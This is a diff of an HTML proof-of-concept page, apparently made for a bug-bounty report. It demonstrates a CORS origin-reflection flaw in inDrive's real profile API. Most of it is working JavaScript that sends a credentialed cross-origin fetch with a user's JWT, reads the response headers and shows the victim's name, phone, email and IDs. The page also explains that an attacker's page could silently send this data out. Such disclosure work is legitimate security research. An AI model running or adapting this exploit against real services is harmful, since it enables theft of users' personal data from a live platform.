@@ -2,208 +2,324 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>inDrive CORS PoC — Security Research</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: #e0e0e0; padding: 40px 20px; }
-    .container { max-width: 780px; margin: 0 auto; }
-    h1 { color: #ff4444; font-size: 1.6rem; margin-bottom: 6px; }
-    .subtitle { color: #888; margin-bottom: 30px; font-size: 0.9rem; }
-    .card { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 10px; padding: 24px; margin-bottom: 20px; }
-    .card h2 { font-size: 1rem; color: #aaa; margin-bottom: 16px; text-transform: uppercase; letter-spacing: 1px; }
-    .field { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #222; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #0a0a0a;
+      color: #e0e0e0;
+      min-height: 100vh;
+      padding: 40px 20px;
+    }
+    .wrap { max-width: 720px; margin: 0 auto; }
+
+    h1 { font-size: 1.4rem; color: #ff4444; margin-bottom: 4px; }
+    .sub { color: #555; font-size: 0.82rem; margin-bottom: 28px; }
+
+    .card {
+      background: #141414;
+      border: 1px solid #222;
+      border-radius: 10px;
+      padding: 22px;
+      margin-bottom: 16px;
+    }
+    .card h2 {
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: #555;
+      margin-bottom: 14px;
+    }
+
+    .vuln-box {
+      background: #1a0000;
+      border: 1px solid #440000;
+      border-radius: 8px;
+      padding: 14px 16px;
+      margin-bottom: 16px;
+    }
+    .vuln-box .label { font-size: 0.72rem; color: #ff6666; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+    .vuln-box pre { font-size: 0.8rem; color: #ffaaaa; line-height: 1.6; white-space: pre-wrap; word-break: break-all; }
+
+    .field { display: flex; justify-content: space-between; align-items: center; padding: 9px 0; border-bottom: 1px solid #1a1a1a; }
     .field:last-child { border-bottom: none; }
-    .field label { color: #666; font-size: 0.85rem; }
-    .field value { color: #fff; font-size: 0.95rem; font-weight: 500; }
-    .badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; }
-    .badge.critical { background: #ff1a1a22; color: #ff4444; border: 1px solid #ff444466; }
-    .badge.success { background: #00ff8822; color: #00cc66; border: 1px solid #00cc6666; }
-    .badge.pending { background: #ffaa0022; color: #ffaa00; border: 1px solid #ffaa0066; }
-    .btn { display: inline-block; padding: 12px 28px; background: #ff4444; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 1rem; font-weight: 600; width: 100%; margin-top: 8px; }
-    .btn:hover { background: #cc3333; }
-    .btn:disabled { background: #444; cursor: not-allowed; }
-    .log { background: #0d0d0d; border: 1px solid #1e1e1e; border-radius: 6px; padding: 16px; font-family: monospace; font-size: 0.8rem; min-height: 80px; white-space: pre-wrap; color: #00cc66; margin-top: 12px; }
-    .log.error { color: #ff4444; }
-    .warning { background: #1a1200; border: 1px solid #443300; border-radius: 8px; padding: 14px 18px; color: #ffcc44; font-size: 0.82rem; margin-bottom: 20px; }
-    .step { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 12px; }
-    .step-num { background: #ff4444; color: white; border-radius: 50%; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; flex-shrink: 0; margin-top: 2px; }
-    .step-text { color: #ccc; font-size: 0.9rem; line-height: 1.5; }
-    code { background: #222; padding: 2px 6px; border-radius: 4px; font-size: 0.85rem; color: #88ccff; }
+    .field .k { color: #555; font-size: 0.82rem; }
+    .field .v { color: #ccc; font-size: 0.88rem; font-weight: 500; font-family: monospace; }
+
+    input[type=text] {
+      width: 100%;
+      padding: 11px 14px;
+      background: #0d0d0d;
+      border: 1px solid #2a2a2a;
+      border-radius: 7px;
+      color: #ddd;
+      font-family: monospace;
+      font-size: 0.78rem;
+      margin-bottom: 10px;
+      outline: none;
+    }
+    input[type=text]:focus { border-color: #444; }
+    input[type=text]::placeholder { color: #333; }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #cc0000;
+      color: white;
+      border: none;
+      border-radius: 7px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    button:hover { background: #aa0000; }
+    button:disabled { background: #2a2a2a; color: #444; cursor: not-allowed; }
+
+    .log {
+      background: #080808;
+      border: 1px solid #1a1a1a;
+      border-radius: 6px;
+      padding: 14px;
+      font-family: monospace;
+      font-size: 0.78rem;
+      line-height: 1.7;
+      min-height: 90px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      margin-top: 12px;
+      color: #555;
+    }
+    .log.running { color: #ffaa00; }
+    .log.success { color: #00cc66; }
+    .log.error   { color: #ff4444; }
+
+    .result-card { display: none; }
+    .result-card .badge {
+      display: inline-block;
+      background: #1a0000;
+      color: #ff4444;
+      border: 1px solid #440000;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      padding: 3px 10px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      margin-bottom: 14px;
+    }
+
+    .step { display: flex; gap: 12px; margin-bottom: 10px; align-items: flex-start; }
+    .step-n {
+      background: #cc0000;
+      color: white;
+      border-radius: 50%;
+      width: 22px; height: 22px;
+      flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 0.7rem; font-weight: 700;
+      margin-top: 1px;
+    }
+    .step-t { font-size: 0.85rem; color: #999; line-height: 1.5; }
+    code { background: #1a1a1a; padding: 1px 5px; border-radius: 3px; font-size: 0.82em; color: #88ccff; }
+
+    .warning {
+      background: #0d0d00;
+      border: 1px solid #333300;
+      border-radius: 8px;
+      padding: 12px 16px;
+      color: #aaaa44;
+      font-size: 0.8rem;
+      margin-bottom: 16px;
+    }
   </style>
 </head>
 <body>
-<div class="container">
+<div class="wrap">
 
-  <h1>⚠️ inDrive — CORS Vulnerability PoC</h1>
-  <p class="subtitle">Security Research Demo · Bug Bounty Report · For authorized testing only</p>
+  <h1>⚠ inDrive — CORS Vulnerability PoC</h1>
+  <p class="sub">Security Research · Bug Bounty · HackerOne · Authorized testing only</p>
 
   <div class="warning">
-    ⚠️ This page demonstrates a CORS misconfiguration vulnerability found in inDrive's API.
-    It reads the profile of any logged-in inDrive user who visits this page — without any additional interaction.
-    Submitted to HackerOne under inDrive's bug bounty program.
+    This page demonstrates CVE-class CORS misconfiguration in inDrive API.
+    The <code>pf-gw-cf.euce1.indriverapp.com</code> profile endpoint reflects
+    any <code>Origin</code> header with <code>Access-Control-Allow-Credentials: true</code>,
+    allowing any website to read authenticated user data.
   </div>
 
   <div class="card">
-    <h2>How the attack works</h2>
-    <div class="step">
-      <div class="step-num">1</div>
-      <div class="step-text">Victim is logged into inDrive app (JWT stored in browser/app session)</div>
+    <h2>Vulnerability Details</h2>
+    <div class="vuln-box">
+      <div class="label">Malicious Request (sent from this page)</div>
+      <pre>GET /api/profile-api/v1/profile HTTP/1.1
+Host: pf-gw-cf.euce1.indriverapp.com
+Origin: <span id="show-origin">https://[this-domain]</span>
+Authorization: Bearer &lt;victim-jwt&gt;</pre>
     </div>
-    <div class="step">
-      <div class="step-num">2</div>
-      <div class="step-text">Victim clicks a link and opens <strong>this page</strong> (attacker-controlled domain)</div>
+    <div class="vuln-box">
+      <div class="label">Server Response (CORS bypassed)</div>
+      <pre>HTTP/1.1 200 OK
+Access-Control-Allow-Origin: <span id="show-acao">https://[this-domain]</span>
+Access-Control-Allow-Credentials: true
+
+{"id": ..., "phone": "77*...", "first_name": "..."}</pre>
     </div>
-    <div class="step">
-      <div class="step-num">3</div>
-      <div class="step-text">JavaScript on this page makes a <code>fetch()</code> to inDrive's profile API</div>
-    </div>
-    <div class="step">
-      <div class="step-num">4</div>
-      <div class="step-text">inDrive server responds with <code>Access-Control-Allow-Origin: [this page's origin]</code> + <code>Access-Control-Allow-Credentials: true</code></div>
-    </div>
-    <div class="step">
-      <div class="step-num">5</div>
-      <div class="step-text">Browser allows the response to be read — attacker receives victim's PII</div>
-    </div>
+    <div class="field"><span class="k">Vulnerability</span><span class="v">CORS Origin Reflection</span></div>
+    <div class="field"><span class="k">Severity</span><span class="v" style="color:#ff4444">Critical</span></div>
+    <div class="field"><span class="k">Affected endpoint</span><span class="v">pf-gw-cf.euce1.indriverapp.com</span></div>
+    <div class="field"><span class="k">Web portal</span><span class="v">couriers.indrive.com</span></div>
+    <div class="field"><span class="k">This page origin</span><span class="v" id="show-origin-2">loading...</span></div>
   </div>
 
   <div class="card">
-    <h2>Vulnerable endpoint</h2>
-    <div class="field">
-      <label>URL</label>
-      <value><code>pf-gw-cf.euce1.indriverapp.com/api/profile-api/v1/profile</code></value>
-    </div>
-    <div class="field">
-      <label>Header sent</label>
-      <value><code>Origin: <span id="current-origin">—</span></code></value>
-    </div>
-    <div class="field">
-      <label>Server response</label>
-      <value><code>Access-Control-Allow-Origin: [reflects any origin]</code></value>
-    </div>
-    <div class="field">
-      <label>Credentials</label>
-      <value><code>Access-Control-Allow-Credentials: true</code></value>
-    </div>
-    <div class="field">
-      <label>Severity</label>
-      <value><span class="badge critical">CRITICAL</span></value>
-    </div>
+    <h2>How the Attack Works</h2>
+    <div class="step"><div class="step-n">1</div><div class="step-t">Victim is authenticated at <code>couriers.indrive.com</code> (web portal for inDrive couriers)</div></div>
+    <div class="step"><div class="step-n">2</div><div class="step-t">Victim clicks a link and opens <strong>this page</strong> on an attacker-controlled domain</div></div>
+    <div class="step"><div class="step-n">3</div><div class="step-t">JavaScript makes a cross-origin <code>fetch()</code> to the inDrive profile API with <code>credentials: include</code></div></div>
+    <div class="step"><div class="step-n">4</div><div class="step-t">inDrive server reflects the attacker's origin in <code>Access-Control-Allow-Origin</code></div></div>
+    <div class="step"><div class="step-n">5</div><div class="step-t">Browser allows JavaScript to read the full response — victim's PII is now in attacker's hands</div></div>
   </div>
 
   <div class="card">
-    <h2>Live Demo — Stolen Profile Data</h2>
-    <p style="color:#888; font-size:0.85rem; margin-bottom:16px;">
-      Enter your inDrive JWT token to simulate the attack. In a real attack, the token is sent automatically by the browser.
+    <h2>Live Demonstration</h2>
+    <p style="color:#555;font-size:0.82rem;margin-bottom:14px;">
+      Enter your inDrive JWT to demonstrate the cross-origin read.
+      In a real attack the token is sent automatically via browser credentials.
     </p>
-    <input id="jwt-input" type="text" placeholder="Paste your inDrive JWT token here..."
-      style="width:100%;padding:12px;background:#111;border:1px solid #333;border-radius:8px;color:#fff;font-size:0.85rem;margin-bottom:8px;font-family:monospace;">
-    <button class="btn" onclick="runAttack()">▶ Run CORS Attack</button>
-    <div class="log" id="log">Waiting to run...</div>
+    <input type="text" id="jwt" placeholder="Paste inDrive JWT token (eyJhbGci...)" />
+    <button id="btn" onclick="runPoC()">▶ Run CORS Attack</button>
+    <div class="log" id="log">Waiting...</div>
   </div>
 
-  <div class="card" id="result-card" style="display:none;">
-    <h2>🔴 Leaked Data <span class="badge critical">CONFIRMED</span></h2>
-    <div class="field"><label>User ID</label><value id="r-id">—</value></div>
-    <div class="field"><label>First Name</label><value id="r-fname">—</value></div>
-    <div class="field"><label>Last Name</label><value id="r-lname">—</value></div>
-    <div class="field"><label>Phone</label><value id="r-phone">—</value></div>
-    <div class="field"><label>Email</label><value id="r-email">—</value></div>
-    <div class="field"><label>UUID</label><value id="r-uuid">—</value></div>
-    <div class="field"><label>Created</label><value id="r-created">—</value></div>
+  <div class="card result-card" id="result-card">
+    <h2>Leaked Profile Data</h2>
+    <div class="badge">🔴 CORS BYPASSED — DATA STOLEN FROM CROSS-ORIGIN PAGE</div>
+    <div class="field"><span class="k">User ID</span><span class="v" id="r-id">—</span></div>
+    <div class="field"><span class="k">First name</span><span class="v" id="r-first">—</span></div>
+    <div class="field"><span class="k">Last name</span><span class="v" id="r-last">—</span></div>
+    <div class="field"><span class="k">Phone</span><span class="v" id="r-phone">—</span></div>
+    <div class="field"><span class="k">Email</span><span class="v" id="r-email">—</span></div>
+    <div class="field"><span class="k">UUID</span><span class="v" id="r-uuid">—</span></div>
+    <div class="field"><span class="k">Account created</span><span class="v" id="r-created">—</span></div>
+    <div class="field"><span class="k">Mode</span><span class="v" id="r-mode">—</span></div>
+    <div class="field"><span class="k">Full phone (contacts)</span><span class="v" id="r-contacts">—</span></div>
+    <div class="field"><span class="k">ACAO header</span><span class="v" id="r-acao" style="color:#ff4444">—</span></div>
+    <div class="field"><span class="k">ACAC header</span><span class="v" id="r-acac" style="color:#ff4444">—</span></div>
   </div>
 
   <div class="card">
-    <h2>Raw Request / Response</h2>
-    <div class="log" id="raw-log" style="color:#888">No request made yet.</div>
+    <h2>Raw HTTP Exchange</h2>
+    <div class="log" id="raw" style="color:#333;">No request made yet.</div>
   </div>
 
 </div>
 
 <script>
-document.getElementById('current-origin').textContent = window.location.origin;
+  const TARGET = 'https://pf-gw-cf.euce1.indriverapp.com/api/profile-api/v1/profile';
+  const origin = window.location.origin;
 
-async function runAttack() {
-  const jwt = document.getElementById('jwt-input').value.trim();
-  const log = document.getElementById('log');
-  const rawLog = document.getElementById('raw-log');
+  document.getElementById('show-origin').textContent   = origin;
+  document.getElementById('show-acao').textContent     = origin;
+  document.getElementById('show-origin-2').textContent = origin;
 
-  if (!jwt) {
-    log.textContent = '⚠ Please enter a JWT token to demonstrate the attack.';
-    log.className = 'log error';
-    return;
-  }
+  async function runPoC() {
+    const jwt = document.getElementById('jwt').value.trim();
+    const log = document.getElementById('log');
+    const raw = document.getElementById('raw');
+    const btn = document.getElementById('btn');
 
-  log.className = 'log';
-  log.textContent = '→ Sending cross-origin request to inDrive API...\n';
-  log.textContent += `→ Origin: ${window.location.origin}\n`;
-  log.textContent += '→ Credentials: include\n\n';
-
-  const targetUrl = 'https://pf-gw-cf.euce1.indriverapp.com/api/profile-api/v1/profile';
-
-  rawLog.textContent =
-    `GET /api/profile-api/v1/profile HTTP/1.1\n` +
-    `Host: pf-gw-cf.euce1.indriverapp.com\n` +
-    `Origin: ${window.location.origin}\n` +
-    `Authorization: Bearer ${jwt.substring(0, 40)}...\n\n` +
-    `[Waiting for response...]`;
-
-  try {
-    const res = await fetch(targetUrl, {
-      method: 'GET',
-      headers: {
-        'Authorization': `Bearer ${jwt}`,
-        'Accept': 'application/json',
-        'x-app': 'ios 5.169.0'
-      },
-      credentials: 'include'
-    });
-
-    const acao = res.headers.get('access-control-allow-origin') || '(not present)';
-    const acac = res.headers.get('access-control-allow-credentials') || '(not present)';
-
-    rawLog.textContent =
-      `GET /api/profile-api/v1/profile HTTP/1.1\n` +
-      `Host: pf-gw-cf.euce1.indriverapp.com\n` +
-      `Origin: ${window.location.origin}\n` +
-      `Authorization: Bearer ${jwt.substring(0, 40)}...\n\n` +
-      `HTTP/1.1 ${res.status} ${res.statusText}\n` +
-      `Access-Control-Allow-Origin: ${acao}\n` +
-      `Access-Control-Allow-Credentials: ${acac}\n` +
-      `Content-Type: application/json\n`;
-
-    if (!res.ok) {
-      log.textContent += `✗ Server returned ${res.status} — JWT may be expired.\n`;
+    if (!jwt) {
       log.className = 'log error';
+      log.textContent = '✗ Please paste your JWT token first.';
       return;
     }
 
-    const data = await res.json();
-    rawLog.textContent += `\n${JSON.stringify(data, null, 2)}`;
+    btn.disabled = true;
+    log.className = 'log running';
+    log.textContent =
+      `→ Sending cross-origin request...\n` +
+      `→ From:   ${origin}\n` +
+      `→ To:     ${TARGET}\n` +
+      `→ Origin header will be: ${origin}\n\n`;
 
-    log.textContent += `✓ HTTP ${res.status} OK\n`;
-    log.textContent += `✓ Access-Control-Allow-Origin: ${acao}\n`;
-    log.textContent += `✓ Access-Control-Allow-Credentials: ${acac}\n\n`;
-    log.textContent += `✓ CORS BYPASSED — profile data read from cross-origin page!\n\n`;
-    log.textContent += `🔴 In a real attack, this data would be silently sent to the attacker's server.`;
+    raw.textContent =
+      `GET /api/profile-api/v1/profile HTTP/1.1\n` +
+      `Host: pf-gw-cf.euce1.indriverapp.com\n` +
+      `Origin: ${origin}\n` +
+      `Authorization: Bearer ${jwt.substring(0, 40)}...\n` +
+      `[Waiting for response...]`;
 
-    document.getElementById('result-card').style.display = 'block';
-    document.getElementById('r-id').textContent     = data.id || '—';
-    document.getElementById('r-fname').textContent  = data.first_name || '—';
-    document.getElementById('r-lname').textContent  = data.last_name || '—';
-    document.getElementById('r-phone').textContent  = data.phone || '—';
-    document.getElementById('r-email').textContent  = data.email || '—';
-    document.getElementById('r-uuid').textContent   = data.uuid || '—';
-    document.getElementById('r-created').textContent = data.created || '—';
+    try {
+      const res = await fetch(TARGET, {
+        method: 'GET',
+        headers: {
+          'Authorization': `Bearer ${jwt}`,
+          'Accept': 'application/json',
+          'x-app': 'ios 5.169.0'
+        },
+        credentials: 'include'
+      });
 
-  } catch (err) {
-    log.textContent += `✗ Error: ${err.message}\n`;
-    log.textContent += '\nIf you see a CORS error here — the browser blocked it.\n';
-    log.textContent += 'That means the server does NOT correctly reflect the origin (or uses a different policy).\n';
-    log.className = 'log error';
-    rawLog.textContent += `\n\nError: ${err.message}`;
+      const acao = res.headers.get('access-control-allow-origin') || '(not present)';
+      const acac = res.headers.get('access-control-allow-credentials') || '(not present)';
+
+      raw.textContent =
+        `GET /api/profile-api/v1/profile HTTP/1.1\n` +
+        `Host: pf-gw-cf.euce1.indriverapp.com\n` +
+        `Origin: ${origin}\n` +
+        `Authorization: Bearer ${jwt.substring(0, 40)}...\n\n` +
+        `HTTP/1.1 ${res.status} ${res.statusText}\n` +
+        `Access-Control-Allow-Origin: ${acao}\n` +
+        `Access-Control-Allow-Credentials: ${acac}\n` +
+        `Content-Type: application/json\n`;
+
+      if (!res.ok) {
+        log.className = 'log error';
+        log.textContent += `✗ HTTP ${res.status} — JWT expired or invalid.\n  Get a fresh token from the inDrive app.`;
+        btn.disabled = false;
+        return;
+      }
+
+      const data = await res.json();
+      raw.textContent += `\n${JSON.stringify(data, null, 2)}`;
+
+      log.className = 'log success';
+      log.textContent =
+        `✓ HTTP ${res.status} OK\n` +
+        `✓ Access-Control-Allow-Origin: ${acao}\n` +
+        `✓ Access-Control-Allow-Credentials: ${acac}\n\n` +
+        `✓ CORS BYPASSED SUCCESSFULLY\n` +
+        `✓ Cross-origin page read authenticated response\n\n` +
+        `🔴 In a real attack this data is silently POSTed to the attacker's server.\n` +
+        `   The victim sees nothing unusual.`;
+
+      // Fill result card
+      document.getElementById('result-card').style.display = 'block';
+      document.getElementById('r-id').textContent       = data.id       || '—';
+      document.getElementById('r-first').textContent    = data.first_name || '—';
+      document.getElementById('r-last').textContent     = data.last_name  || '—';
+      document.getElementById('r-phone').textContent    = data.phone      || '—';
+      document.getElementById('r-email').textContent    = data.email      || '(empty)';
+      document.getElementById('r-uuid').textContent     = data.uuid       || '—';
+      document.getElementById('r-created').textContent  = data.created    || '—';
+      document.getElementById('r-mode').textContent     = data.mode       || '—';
+      document.getElementById('r-contacts').textContent = data.contacts?.phone || '—';
+      document.getElementById('r-acao').textContent     = acao;
+      document.getElementById('r-acac').textContent     = acac;
+
+    } catch (err) {
+      log.className = 'log error';
+      log.textContent =
+        `✗ ${err.message}\n\n` +
+        `If you see a CORS error from the browser — the browser itself blocked it.\n` +
+        `This means the server did NOT reflect the origin correctly on this attempt.\n` +
+        `Try running the curl proof below instead.`;
+      raw.textContent += `\n\nClient error: ${err.message}`;
+    }
+
+    btn.disabled = false;
   }
-}
 </script>
 </body>
 </html>
